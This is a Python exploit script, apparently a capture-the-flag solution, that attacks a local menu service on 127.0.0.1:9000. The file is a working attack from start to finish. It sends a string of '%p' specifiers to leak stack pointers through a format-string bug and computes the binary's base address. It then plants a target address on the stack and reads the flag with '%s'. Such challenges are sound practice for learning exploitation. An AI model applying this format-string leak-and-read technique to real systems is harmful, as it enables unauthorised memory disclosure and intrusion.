import socket
import readline

host = '127.0.0.1'
port = 9000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None, p=True):
	print(f'[*] {info}')
	res = s.recv(4096).decode('ascii')
	if p is True:
		print(res)
	return res

def send(data):
	print(f'[*] Sending {data}')
	data = data + '\n'
	data = data.encode('ascii')
	s.send(data)	

def choose(c):
	send(str(c))
	recv(f'Choose {c}')

# 5: format string vuln to read, write
# 3: write 32 bytes to stack once

recv('Menu', False)

payload = '%p'*10

choose(5)
send(payload)
res = recv('Leak address', False)
base_addr = int(res.split()[4][-14:], 16) - 0x11e0
print(f'[+] Address base: {hex(base_addr)}')

flag_addr = base_addr + 0x4060
payload  = b'1 '
payload += b'A'*24
payload += flag_addr.to_bytes(8, 'little') + b'\n'

choose(3)
s.send(payload)
print(s.recv(4096))

choose(5)
send('%p'*8 + '%s')
res = recv('Flag', False)
flag = res[res.rfind('FLAG'):res.rfind('}')+1]
print(flag)
